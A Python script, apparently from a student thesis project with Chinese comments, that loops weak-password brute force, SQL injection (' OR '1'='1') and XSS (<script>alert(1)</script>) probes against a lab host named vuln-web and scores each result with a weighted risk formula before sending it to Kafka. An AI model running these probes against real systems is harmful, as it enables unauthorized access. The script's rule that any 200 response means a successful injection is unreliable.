import time
import json
import requests
import os
from kafka import KafkaProducer

# 环境变量配置
KAFKA_BROKER = os.environ.get('KAFKA_BROKER', 'kafka:9092')
TOPIC = 'evidence_topic'

# 靶机目标地址
LOGIN_URL = 'http://vuln-web:5000/login'
SEARCH_URL = 'http://vuln-web:5000/search'
XSS_URL   = 'http://vuln-web:5000/feedback'

# --- [学术化改进] 定义漏洞特征向量 ---
# Impact (危害影响): 0-10, 代表对机密性/完整性的破坏程度
# AC (攻击复杂度): 0-10, 代表复现该漏洞的技术门槛
VULN_METRICS = {
    "sql_injection": {
        "impact": 9.5,  # 极高：直接导致数据库泄露
        "ac": 2.0       # 低：利用工具或简单Payload即可
    },
    "brute_force": {
        "impact": 7.0,  # 中高：获取特定账号权限
        "ac": 1.0       # 极低：无技术门槛，仅需字典
    },
    "xss_attack": {
        "impact": 4.0,  # 低：通常局限于客户端影响
        "ac": 3.0       # 低：需要构造闭合标签
    }
}

def get_producer():
    while True:
        try:
            return KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda x: json.dumps(x).encode('utf-8')
            )
        except:
            time.sleep(5)

# --- [核心算法] 基于多因子权重的动态风险量化模型 ---
def calculate_dynamic_risk(attack_type, success):
    # 如果攻击失败，风险为 0
    if not success:
        return "INFO", 0.0

    # 1. 获取该类漏洞的基础向量 (默认值为中等 5.0)
    metrics = VULN_METRICS.get(attack_type, {"impact": 5.0, "ac": 5.0})
    impact = metrics["impact"]
    complexity = metrics["ac"]

    # 2. 计算易利用性 (Exploitability)
    # 公式：易利用性 = 10 - 攻击复杂度
    exploitability = 10.0 - complexity

    # 3. 计算加权风险评分 (Risk Score)
    # 设定权重：危害影响占 60% (alpha=0.6)，易利用性占 40% (beta=0.4)
    # Formula: Score = (Impact * 0.6) + (Exploitability * 0.4)
    raw_score = (impact * 0.6) + (exploitability * 0.4)
    
    # 保留一位小数
    final_score = round(raw_score, 1)

    # 4. 动态映射风险等级 (Mapping)
    # 评分区间 [0, 10]
    if final_score >= 8.0:
        label = "HIGH"
    elif final_score >= 6.0:
        label = "MEDIUM"
    else:
        label = "LOW"
    
    # [论文数据] 打印详细的计算日志，用于证明算法在运行
    print(f"--- [风险评估算法] 类型:{attack_type} | 危害(I):{impact} | 复杂度(AC):{complexity} | 计算得分:{final_score} => 等级:{label} ---")
    
    return label, final_score

def send_evidence(producer, attack_type, target, payload, success, http_status=0):
    # 调用算法计算风险
    risk_label, risk_score = calculate_dynamic_risk(attack_type, success)
    
    evidence = {
        "timestamp": time.time(),
        "attack_type": attack_type,
        "target": target,
        "payload": payload,
        "result": "success" if success else "fail",
        "http_status": http_status,
        "risk_level": risk_label,  # 传给 Consumer 文本标签 (兼容旧代码)
        "risk_score": risk_score   # 传给 Consumer 具体分数 (扩展字段)
    }
    producer.send(TOPIC, value=evidence)
    producer.flush()
    print(f"[*] 证据上链: {attack_type} -> {evidence['result']} ({risk_label})\n")

# 1. 弱口令模块
def run_brute_force(producer):
    print(">>> 启动模块: 弱口令暴力破解 (Brute Force)")
    for pwd in ["123456", "admin123"]:
        try:
            resp = requests.post(LOGIN_URL, json={"username": "admin", "password": pwd}, timeout=1)
            send_evidence(producer, "brute_force", LOGIN_URL, pwd, resp.status_code==200, resp.status_code)
            if resp.status_code == 200: break
        except: pass
        time.sleep(0.5)

# 2. SQL 注入模块
def run_sql_injection(producer):
    print(">>> 启动模块: SQL 注入探测 (SQL Injection)")
    for pay in ["admin", "' OR '1'='1"]:
        try:
            resp = requests.get(SEARCH_URL, params={"q": pay}, timeout=1)
            # 只要状态码是 200 即视为注入/探测成功
            success = (resp.status_code == 200)
            send_evidence(producer, "sql_injection", SEARCH_URL, pay, success, resp.status_code)
        except: pass
        time.sleep(1)

# 3. XSS 模块
def run_xss_scan(producer):
    print(">>> 启动模块: XSS 跨站脚本探测 (Cross Site Scripting)")
    payload = "<script>alert(1)</script>"
    try:
        resp = requests.post(XSS_URL, json={"content": payload}, timeout=1)
        # 检查 Payload 回显
        success = payload in resp.text
        send_evidence(producer, "xss_attack", XSS_URL, payload, success, resp.status_code)
    except: pass
    time.sleep(1)

if __name__ == '__main__':
    producer = get_producer()
    print("**************************************************")
    print("* 基于多因子权重的风险评估模型 (Risk Model v2.0) 已加载 *")
    print("**************************************************\n")
    while True:
        run_brute_force(producer)
        time.sleep(1)
        run_sql_injection(producer)
        time.sleep(1)
        run_xss_scan(producer)
        print("=== [周期结束] 等待下一轮评估 (5秒) ===\n")
        time.sleep(5)
